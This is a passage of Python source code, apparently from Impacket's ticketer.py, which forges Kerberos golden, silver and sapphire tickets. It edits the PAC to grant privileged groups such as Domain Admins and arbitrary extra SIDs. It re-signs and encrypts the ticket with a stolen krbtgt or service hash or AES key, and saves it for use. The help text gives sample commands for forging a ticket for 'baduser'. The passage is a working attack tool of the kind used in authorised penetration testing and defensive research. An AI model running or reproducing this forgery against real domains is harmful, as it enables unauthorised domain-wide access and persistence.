            encTicketPart['authorization-data'][0]['ad-data'] = noValue

            # Let's locate the KERB_VALIDATION_INFO and Checksums
            if PAC_LOGON_INFO in pacInfos:
                data = pacInfos[PAC_LOGON_INFO]
                validationInfo = VALIDATION_INFO()
                validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
                lenVal = len(validationInfo.getData())
                validationInfo.fromStringReferents(data, lenVal)

                aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))

                unixTime = self.getFileTime(aTime)

                kerbdata = KERB_VALIDATION_INFO()

                kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
                kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

                # Let's adjust username and other data
                validationInfo['Data']['LogonDomainName'] = self.__domain.upper()
                validationInfo['Data']['EffectiveName'] = self.__target
                # Our Golden Well-known groups! :)
                groups = self.__options.groups.split(',')
                validationInfo['Data']['GroupIds'] = list()
                validationInfo['Data']['GroupCount'] = len(groups)

                for group in groups:
                    groupMembership = GROUP_MEMBERSHIP()
                    groupId = NDRULONG()
                    groupId['Data'] = int(group)
                    groupMembership['RelativeId'] = groupId
                    groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                    validationInfo['Data']['GroupIds'].append(groupMembership)

                # Let's add the extraSid
                extra_sids_to_add = []
                
                # Add extra SIDs from command line options
                if self.__options.extra_sid is not None:
                    extra_sids_to_add.extend(self.__options.extra_sid.split(','))
                
                # Add extra SIDs from LDAP (like S-1-18-1 from legitimate tickets)
                if self.__options.ldap and self.__user_info and 'extraSids' in self.__user_info:
                    extra_sids_to_add.extend(self.__user_info['extraSids'])
                
                if extra_sids_to_add:
                    if validationInfo['Data']['SidCount'] == 0:
                        # Let's be sure user's flag specify we have extra sids.
                        validationInfo['Data']['UserFlags'] |= 0x20
                        validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
                    
                    for extrasid in extra_sids_to_add:
                        validationInfo['Data']['SidCount'] += 1

                        sidRecord = KERB_SID_AND_ATTRIBUTES()

                        sid = RPC_SID()
                        sid.fromCanonical(extrasid)

                        sidRecord['Sid'] = sid
                        sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

                        # And, let's append the extraSid
                        validationInfo['Data']['ExtraSids'].append(sidRecord)
                    
                    logging.info('Added %d extra SIDs to PAC' % len(extra_sids_to_add))
                else:
                    validationInfo['Data']['ExtraSids'] = NULL

                validationInfoBlob  = validationInfo.getData() + validationInfo.getDataReferents()
                pacInfos[PAC_LOGON_INFO] = validationInfoBlob

                if logging.getLogger().level == logging.DEBUG:
                    logging.debug('VALIDATION_INFO after making it gold')
                    validationInfo.dump()
                    print('\n')
            else:
                raise Exception('PAC_LOGON_INFO not found! Aborting')

            logging.info('\tPAC_LOGON_INFO')

            # Let's now clear the checksums
            if PAC_SERVER_CHECKSUM in pacInfos:
                serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
                if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                    serverChecksum['Signature'] = '\x00' * 12
                elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                    serverChecksum['Signature'] = '\x00' * 12
                else:
                    serverChecksum['Signature'] = '\x00' * 16
                pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
            else:
                raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')

            if PAC_PRIVSVR_CHECKSUM in pacInfos:
                privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
                privSvrChecksum['Signature'] = '\x00' * 12
                if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                    privSvrChecksum['Signature'] = '\x00' * 12
                elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                    privSvrChecksum['Signature'] = '\x00' * 12
                else:
                    privSvrChecksum['Signature'] = '\x00' * 16
                pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
            else:
                raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')

            if PAC_CLIENT_INFO_TYPE in pacInfos:
                pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
                pacClientInfo['ClientId'] = unixTime
                pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
            else:
                raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')

            logging.info('\tPAC_CLIENT_INFO_TYPE')
            logging.info('\tEncTicketPart')

        if self.__domain == self.__server:
            encRepPart = EncASRepPart()
        else:
            encRepPart = EncTGSRepPart()

        encRepPart['key'] = noValue
        encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
        encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
        encRepPart['last-req'] = noValue
        encRepPart['last-req'][0] = noValue
        encRepPart['last-req'][0]['lr-type'] = 0
        encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
        encRepPart['nonce'] = 123456789
        encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
        flags = []
        for i in encTicketPart['flags']:
            flags.append(i)
        encRepPart['flags'] = flags
        encRepPart['authtime'] = str(encTicketPart['authtime'])
        encRepPart['endtime'] = str(encTicketPart['endtime'])
        encRepPart['starttime'] = str(encTicketPart['starttime'])
        encRepPart['renew-till'] = str(encTicketPart['renew-till'])
        encRepPart['srealm'] = self.__domain.upper()
        encRepPart['sname'] = noValue
        encRepPart['sname']['name-string'] = noValue
        encRepPart['sname']['name-string'][0] = self.__service

        if self.__domain == self.__server:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
            encRepPart['sname']['name-string'][1] = self.__domain.upper()
            logging.info('\tEncAsRepPart')
        else:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encRepPart['sname']['name-string'][1] = self.__server
            logging.info('\tEncTGSRepPart')
        return encRepPart, encTicketPart, pacInfos

    def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
        logging.info('Signing/Encrypting final ticket')

        # Basic PAC count
        pac_count = 4

        # We changed everything we needed to make us special. Now let's repack and calculate checksums
        validationInfoBlob = pacInfos[PAC_LOGON_INFO]
        validationInfoAlignment = b'\x00' * self.getPadLength(len(validationInfoBlob))

        pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
        pacClientInfoAlignment = b'\x00' * self.getPadLength(len(pacClientInfoBlob))

        pacUpnDnsInfoBlob = None
        pacUpnDnsInfoAlignment = None
        if PAC_UPN_DNS_INFO in pacInfos:
            pac_count += 1
            pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]
            pacUpnDnsInfoAlignment = b'\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))

        pacAttributesInfoBlob = None
        pacAttributesInfoAlignment = None
        if PAC_ATTRIBUTES_INFO in pacInfos:
            pac_count += 1
            pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]
            pacAttributesInfoAlignment = b'\x00' * self.getPadLength(len(pacAttributesInfoBlob))

        pacRequestorInfoBlob = None
        pacRequestorInfoAlignment = None
        if PAC_REQUESTOR_INFO in pacInfos:
            pac_count += 1
            pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]
            pacRequestorInfoAlignment = b'\x00' * self.getPadLength(len(pacRequestorInfoBlob))

        serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
        serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]
        serverChecksumAlignment = b'\x00' * self.getPadLength(len(serverChecksumBlob))

        privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
        privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]
        privSvrChecksumAlignment = b'\x00' * self.getPadLength(len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])

        pacUpnDnsInfoIB = None
        if pacUpnDnsInfoBlob is not None:
            pacUpnDnsInfoIB = PAC_INFO_BUFFER()
            pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO
            pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)
            pacUpnDnsInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])

        pacAttributesInfoIB = None
        if pacAttributesInfoBlob is not None:
            pacAttributesInfoIB = PAC_INFO_BUFFER()
            pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO
            pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)
            pacAttributesInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])

        pacRequestorInfoIB = None
        if pacRequestorInfoBlob is not None:
            pacRequestorInfoIB = PAC_INFO_BUFFER()
            pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO
            pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)
            pacRequestorInfoIB['Offset'] = offsetData
            offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        # offsetData = self.getBlockLength(offsetData+privSvrChecksumIB['cbBufferSize'])

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = validationInfoIB.getData() + pacClientInfoIB.getData()
        if pacUpnDnsInfoIB is not None:
            buffers += pacUpnDnsInfoIB.getData()
        if pacAttributesInfoIB is not None:
            buffers += pacAttributesInfoIB.getData()
        if pacRequestorInfoIB is not None:
            buffers += pacRequestorInfoIB.getData()

        buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + \
            validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
        if pacUpnDnsInfoIB is not None:
            buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment
        if pacAttributesInfoIB is not None:
            buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment
        if pacRequestorInfoIB is not None:
            buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment

        buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = pac_count
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = pacType.getData()

        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
        if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])

        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
        if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])

        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
        logging.info('\tPAC_SERVER_CHECKSUM')
        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])
        logging.info('\tPAC_PRIVSVR_CHECKSUM')

        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorizationData[0]['ad-data'] = pacType.getData()
        authorizationData = encoder.encode(authorizationData)

        encTicketPart['authorization-data'][0]['ad-data'] = authorizationData

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Customized EncTicketPart')
            print(encTicketPart.prettyPrint())
            print('\n')

        encodedEncTicketPart = encoder.encode(encTicketPart)

        cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]
        if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.rc4_hmac.value:
            key = Key(cipher.enctype, unhexlify(self.__options.nthash))
        else:
            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes TGS session
        # key or application session key), encrypted with the
        # service key (Section 5.3)
        logging.info('\tEncTicketPart')
        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)

        kdcRep['ticket']['enc-part']['cipher'] = cipherText
        kdcRep['ticket']['enc-part']['kvno'] = 2

        # Lastly.. we have to encrypt the kdcRep['enc-part'] part
        # with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
        encodedEncASRepPart = encoder.encode(encASorTGSRepPart)

        if self.__domain == self.__server:
            # Key Usage 3
            # AS-REP encrypted part (includes TGS session key or
            # application session key), encrypted with the client key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
            logging.info('\tEncASRepPart')
            cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)
        else:
            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
            logging.info('\tEncTGSRepPart')
            cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)

        kdcRep['enc-part']['cipher'] = cipherText
        kdcRep['enc-part']['etype'] = cipher.enctype
        kdcRep['enc-part']['kvno'] = 1

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final Golden Ticket')
            print(kdcRep.prettyPrint())
            print('\n')

        return encoder.encode(kdcRep), cipher, sessionKey

    def saveTicket(self, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
        from impacket.krb5.ccache import CCache
        ccache = CCache()

        if self.__server == self.__domain:
            ccache.fromTGT(ticket, sessionKey, sessionKey)
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__target.replace('/','.') + '.ccache')

    def cleanup(self):
        """Close connections"""
        try:
            if self.__ldap_connection:
                self.__ldap_connection.close()
            if self.__smb_connection:
                self.__smb_connection.close()
        except:
            pass

    def run(self):
        try:
            ticket, adIfRelevant = self.createBasicTicket()
            if ticket is not None:
                encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
                ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
                self.saveTicket(ticket, sessionKey)
        finally:
            self.cleanup()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                "user options")
    parser.add_argument('target', action='store', help='username for the newly created ticket')
    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
                                                     ' be generated for. if omitted, golden ticket will be created')
    parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                        'changing only the supplied information. It requires specifying -user')
    parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
    parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
                                                            'generated for')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                             '(128 or 256 bits)')
    parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
    parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file (silver ticket only)')
    parser.add_argument('-groups', action="store", default = '513,512,520,518,519', help='comma separated list of '
                        'groups user will belong to (default = 513,512,520,518,519)')
    parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                          'created for (default = 500)')
    parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
    parser.add_argument('-extra-pac', action='store_true', help='[DEPRECATED] UPN_DNS PAC is now always included with dynamically determined flags to match legitimate tickets')
    parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                              'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
                                                                             '(default = 24*365*10)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-user', action="store", help='domain/username to be used if -request is chosen (it can be '
                                                     'different from domain/username')
    group.add_argument('-password', action="store", help='password for domain/username')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
                                                             ' for querying the ST and extracting the PAC, which will be'
                                                             ' included in the new ticket')
    parser.add_argument('-ldap', action='store_true', default=False, help='When used with -request, automatically '
                        'gather user and group information from LDAP and domain policies from SYSVOL')

    if len(sys.argv)==1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n")
        print("\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.")
        print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
        print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
        print("\tbaduser.ccache.\n")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
              "<your domain FQDN> -request -user <a valid domain user> -password 'Password123' -ldap 'carline.lamar' baduser\n")
        print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
        print("\tas template for customization. It will then query LDAP for 'carline.lamar' information to populate")
        print("\tthe PAC. Ticket will be generated for 'baduser' and saved as baduser.ccache")
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    if options.domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.aesKey is None and options.nthash is None and options.keytab is None:
        logging.error('You have to specify either aesKey, or nthash, or keytab')
        sys.exit(1)

    if options.aesKey is not None and options.nthash is not None and options.request is False:
        logging.error('You cannot specify both -aesKey and -nthash w/o using -request. Pick only one')
        sys.exit(1)

    if options.request is True and options.user is None:
        logging.error('-request parameter needs -user to be specified')
        sys.exit(1)

    if options.request is True and options.hashes is None and options.password is None:
        from getpass import getpass
        password = getpass("Password:")
    else:
        password = options.password

    if options.impersonate:
        # args that can't be None: -aesKey, -domain-sid, -nthash, -request, -domain, -user, -password
        # -user-id can't be None except if -old-pac is set
        # args that can't be False: -request
        missing_params = [
            param_name
            for (param, param_name) in
            zip(
                [
                    options.request,
                    options.aesKey, options.nthash,
                    options.domain, options.user, options.password,
                    options.domain_sid, options.user_id
                ],
                [
                    "-request",
                    "-aesKey", "-nthash",
                    "-domain", "-user", "-password",
                    "-domain-sid", "-user-id"
                ]
            )
            if param is None or (param_name == "-request" and not param)
        ]
        if missing_params:
            logging.error(f"missing parameters to do sapphire ticket : {', '.join(missing_params)}")
            sys.exit(1)
        if not options.old_pac and not options.user_id:
            logging.error(f"missing parameter -user-id. Must be set if not doing -old-pac")
            sys.exit(1)
        # ignored params: -extra-pac, -extra-sid, -groups, -duration
        # -user-id ignored if -old-pac
        ignored_params = []
        if options.extra_pac: ignored_params.append("-extra-pac")
        if options.extra_sid is not None: ignored_params.append("-extra-sid")
        if options.groups is not None: ignored_params.append("-groups")
        if options.duration is not None: ignored_params.append("-duration")
        if ignored_params:
            logging.error(f"doing sapphire ticket, ignoring following parameters : {', '.join(ignored_params)}")
        if options.old_pac and options.user_id is not None:
            logging.error(f"parameter -user-id will be ignored when specifying -old-pac in a sapphire ticket attack")

    try:
        executer = TICKETER(options.target, password, options.domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))
